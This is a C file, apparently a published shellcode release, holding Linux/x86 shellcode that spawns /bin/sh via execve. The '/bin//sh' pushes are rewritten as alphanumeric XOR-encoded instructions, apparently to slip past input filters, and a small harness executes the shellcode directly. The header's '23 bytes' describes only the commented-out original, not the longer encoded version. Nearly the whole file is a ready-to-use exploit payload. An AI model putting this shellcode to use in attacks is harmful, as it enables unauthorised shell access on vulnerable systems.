/*
    *****************************************************
    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
    *****************************************************
    *         Author: Hamza Megahed                     *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************

xor    %eax,%eax
push   %eax
push   %eax
push   %eax
59  Y   POP CX/ECX
5A  Z   POP DX/EDX
""
push   $0x68732f2f
j 0:            PUSH 0x30
X:              POP EAX
5 J C C X:      XOR EAX, $0x5843434A
5 U l 0 0:      XOR EAX, $0x30306c55
P:              PUSH EAX
push   $0x6e69622f
j 0:            PUSH 0x30
X:              POP EAX
5 J R Y Y:      XOR EAX, $0x5959524A
5 U 0 0 7:      XOR EAX, $0x37303055
P:              PUSH EAX
xor    %eax,%eax
""
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
*/
#include <stdio.h>
#include <string.h>

//char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
//"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

char *shellcode = "\x31\xc0\x50\x50\x50YZj0X5JCCX5Ul00Pj0X5JRYY5U007P\x31\xc0\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
    fprintf(stdout,"Length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}
